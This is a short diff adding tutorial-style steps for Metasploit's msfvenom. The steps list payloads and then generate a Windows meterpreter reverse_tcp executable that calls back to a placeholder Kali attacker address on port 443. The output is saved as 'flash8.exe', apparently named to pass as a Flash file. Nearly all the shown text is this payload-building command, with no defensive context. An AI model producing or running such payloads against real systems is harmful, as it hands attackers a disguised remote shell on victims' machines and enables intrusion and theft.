@@ -1,1 +1,6 @@
-
+1) Run commands:
+> msfvenom
+> msfvenom -l payloads
+> msfvenom -p windows/meterpreter/reverse_tcp LHOST=<KALI DEVICE IPADDRESS>
+LPORT=443 -f exe > flash8.exe
+> 
